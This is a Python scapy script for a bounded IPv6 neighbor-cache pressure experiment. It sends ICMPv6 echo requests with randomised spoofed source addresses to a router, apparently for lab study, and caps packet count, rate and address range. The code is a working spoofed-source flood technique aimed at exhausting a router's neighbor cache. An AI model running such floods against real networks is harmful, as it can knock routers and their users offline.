
#!/usr/bin/env python3

import argparse
import ipaddress
import random
import time

from scapy.all import (
    Ether,
    IPv6,
    ICMPv6EchoRequest,
    get_if_hwaddr,
    sendp
)


MAX_COUNT = 1000
MAX_RATE = 100


def random_source(network, used):
    while True:
        offset = random.randrange(1, network.num_addresses - 1)
        address = network.network_address + offset

        if address not in used:
            used.add(address)
            return str(address)


def main():
    parser = argparse.ArgumentParser(
        description="Bounded neighbor-cache pressure experiment"
    )

    parser.add_argument("--iface", required=True)
    parser.add_argument(
        "--target-ip",
        default="2001:db8:10:1::1"
    )
    parser.add_argument("--target-mac", required=True)
    parser.add_argument("--attacker-mac", default=None)

    parser.add_argument(
        "--lan-prefix",
        default="2001:db8:10:1::/64"
    )

    parser.add_argument(
        "--spoof-prefix",
        default="2001:db8:10:1:8000::/80"
    )

    parser.add_argument("--count", type=int, default=300)
    parser.add_argument("--rate", type=int, default=50)

    args = parser.parse_args()

    try:
        lan = ipaddress.IPv6Network(args.lan_prefix)
        spoof_pool = ipaddress.IPv6Network(args.spoof_prefix)
        target = ipaddress.IPv6Address(args.target_ip)
    except ValueError as exc:
        parser.error(str(exc))

    if target not in lan:
        parser.error("Target must belong to the lab LAN")

    if not spoof_pool.subnet_of(lan):
        parser.error("Spoof pool must be contained inside the lab LAN")

    if not 1 <= args.count <= MAX_COUNT:
        parser.error(f"--count must be between 1 and {MAX_COUNT}")

    if not 1 <= args.rate <= MAX_RATE:
        parser.error(f"--rate must be between 1 and {MAX_RATE}")

    attacker_mac = args.attacker_mac or get_if_hwaddr(args.iface)

    used_sources = set()
    delay = 1.0 / args.rate

    print("Neighbor-cache pressure experiment")
    print(f"Target router: {target}")
    print(f"Spoofed source pool: {spoof_pool}")
    print(f"Packets: {args.count}")
    print(f"Rate: {args.rate} packets/second")

    start = time.monotonic()

    try:
        for seq in range(args.count):
            source_ip = random_source(spoof_pool, used_sources)

            packet = (
                Ether(
                    src=attacker_mac,
                    dst=args.target_mac
                )
                /
                IPv6(
                    src=source_ip,
                    dst=str(target),
                    hlim=64
                )
                /
                ICMPv6EchoRequest(
                    id=0x4242,
                    seq=seq
                )
            )

            packet_start = time.monotonic()

            sendp(
                packet,
                iface=args.iface,
                verbose=False
            )

            remaining = delay - (
                time.monotonic() - packet_start
            )

            if remaining > 0:
                time.sleep(remaining)

    except KeyboardInterrupt:
        print("Interrupted.")

    elapsed = time.monotonic() - start

    print(f"Packets sent: {len(used_sources)}")
    print(f"Elapsed time: {elapsed:.2f} seconds")


if __name__ == "__main__":
    main()
